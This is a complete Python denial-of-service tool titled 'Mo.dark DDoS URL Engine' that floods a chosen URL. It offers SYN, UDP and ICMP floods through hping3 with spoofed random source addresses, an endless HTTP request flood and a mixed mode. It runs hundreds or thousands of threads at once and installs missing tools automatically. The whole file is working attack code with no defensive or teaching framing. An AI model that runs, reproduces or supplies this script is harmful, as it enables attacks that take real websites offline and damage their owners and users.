#!/usr/bin/env python3
import sys, os, re, socket, time, threading, signal, random
import subprocess
from urllib.parse import urlparse

R, G, Y, C, P, N = (
    '\033[0;31m', '\033[0;32m', '\033[1;33m',
    '\033[0;36m', '\033[0;35m', '\033[0m'
)

BANNER = f"""{R}
    ██████╗ ██████╗  ██████╗ ███████╗    ██╗   ██╗██████╗ ██╗
    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ██║   ██║██╔══██╗██║
    ██║  ██║██████╔╝██║   ██║███████╗    ██║   ██║██████╔╝██║
    ██║  ██║██╔══██╗██║   ██║╚════██║    ██║   ██║██╔══██╗██║
    ██████╔╝██║  ██║╚██████╔╝███████║    ╚██████╔╝██║  ██║██║
    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝
{N}
{C}=====[ Mo.dark DDoS URL Engine v7.0 - UESM ]====={N}
{Y}U N R E S T R I C T E D   M O D E{N}\n"""

running = True

def check_root():
    if os.name != 'nt' and os.geteuid() != 0:
        print(f"{R}[X] Root privileges required on Linux. Use sudo.{N}")
        sys.exit(1)

def parse_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    parsed = urlparse(url)
    domain = parsed.hostname
    proto = parsed.scheme
    path = parsed.path if parsed.path else '/'
    port = parsed.port
    if port is None:
        port = 443 if proto == 'https' else 80
    return domain, port, proto, path

def resolve_dns(domain):
    try:
        return socket.gethostbyname(domain)
    except:
        return None

def syn_flood(target_ip, port, thread_id):
    global running
    try:
        cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', target_ip]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        while running:
            time.sleep(0.5)
        proc.terminate()
    except:
        pass

def udp_flood(target_ip, port, thread_id):
    global running
    try:
        cmd = ['hping3', '--udp', '-p', str(port), '--flood', '--rand-source', target_ip]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        while running:
            time.sleep(0.5)
        proc.terminate()
    except:
        pass

def icmp_flood(target_ip, thread_id):
    global running
    try:
        cmd = ['hping3', '--icmp', '--flood', '--rand-source', target_ip]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        while running:
            time.sleep(0.5)
        proc.terminate()
    except:
        pass

def http_flood(url, thread_id):
    global running
    try:
        import requests
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        while running:
            try:
                session.get(url, timeout=2, headers=headers, verify=False)
            except:
                pass
    except ImportError:
        import urllib.request
        while running:
            try:
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                urllib.request.urlopen(req, timeout=2)
            except:
                pass

def mixed_flood(target_ip, port, url, thread_id):
    global running
    if thread_id % 2 == 0:
        syn_flood(target_ip, port, thread_id)
    else:
        http_flood(url, thread_id)

def show_help():
    print(f"""{G}Usage:{N} python3 ddos_url_engine_en.py <URL> <THREADS> <TYPE>

{G}Examples:{N}
  {C}python3 ddos_url_engine_en.py http://example.com 500 syn{N}
  {C}python3 ddos_url_engine_en.py https://target.com 1000 http{N}

{G}Attack Types:{N}
  {C}syn{N}   - SYN Flood (Linux, requires hping3)
  {C}udp{N}   - UDP Flood (Linux, requires hping3)
  {C}icmp{N}  - ICMP Flood (Linux, requires hping3)
  {C}http{N}  - HTTP/HTTPS Flood (cross-platform)
  {C}mixed{N} - SYN + HTTP combined
""")
    sys.exit(1)

def signal_handler(sig, frame):
    global running
    print(f"\n{R}[!] Attack stopped.{N}")
    running = False
    sys.exit(0)

def main():
    global running
    if len(sys.argv) != 4:
        show_help()
    
    url = sys.argv[1]
    try:
        threads = int(sys.argv[2])
    except:
        show_help()
    
    attack_type = sys.argv[3].lower()
    
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    if os.name != 'nt':
        check_root()
    
    domain, port, proto, path = parse_url(url)
    full_url = f"{proto}://{domain}:{port}{path}"
    
    print(f"{C}[*] Target URL:{N} {url}")
    print(f"{G}   Domain:{N} {domain}")
    print(f"{G}   Port:{N} {port}")
    print(f"{G}   Protocol:{N} {proto}")
    print(f"{G}   Path:{N} {path}")
    
    print(f"{C}[*] Resolving DNS...{N}")
    target_ip = resolve_dns(domain)
    if not target_ip:
        print(f"{R}[X] DNS resolution failed: {domain}{N}")
        sys.exit(1)
    
    print(f"{G}[✓] Target IP:{N} {target_ip}:{port}")
    print(f"{R}[!] Attacking {url}... Press Ctrl+C to stop{N}\n")
    
    signal.signal(signal.SIGINT, signal_handler)
    
    if attack_type in ['syn', 'udp', 'icmp', 'mixed'] and os.name != 'nt':
        try:
            subprocess.run(['hping3', '--help'], capture_output=True, check=True)
        except:
            print(f"{Y}[!] hping3 not installed. Installing...{N}")
            subprocess.run(['apt-get', 'update', '-y'], capture_output=True)
            subprocess.run(['apt-get', 'install', '-y', 'hping3'], capture_output=True)
            print(f"{G}[✓] hping3 installed.{N}")
    
    if attack_type in ['http', 'mixed']:
        try:
            import requests
        except ImportError:
            print(f"{Y}[!] requests not installed. Installing...{N}")
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests', '-q'])
            print(f"{G}[✓] requests installed.{N}")
    
    print(f"{C}[*] Starting {attack_type.upper()} flood on {url}{N}")
    
    threads_list = []
    for i in range(threads):
        if attack_type == 'syn':
            t = threading.Thread(target=syn_flood, args=(target_ip, port, i))
        elif attack_type == 'udp':
            t = threading.Thread(target=udp_flood, args=(target_ip, port, i))
        elif attack_type == 'icmp':
            t = threading.Thread(target=icmp_flood, args=(target_ip, i))
        elif attack_type == 'http':
            t = threading.Thread(target=http_flood, args=(full_url, i))
        elif attack_type == 'mixed':
            t = threading.Thread(target=mixed_flood, args=(target_ip, port, full_url, i))
        else:
            print(f"{R}[X] Unknown attack type: {attack_type}{N}")
            show_help()
        
        t.daemon = True
        t.start()
        threads_list.append(t)
    
    try:
        spin = ['/', '-', '\\', '|']
        idx = 0
        while running:
            active = threading.active_count() - 1
            print(f"\r{P}Active threads: {active} {spin[idx % 4]}{N}", end="")
            idx += 1
            time.sleep(0.2)
    except KeyboardInterrupt:
        signal_handler(None, None)

if __name__ == "__main__":
    main()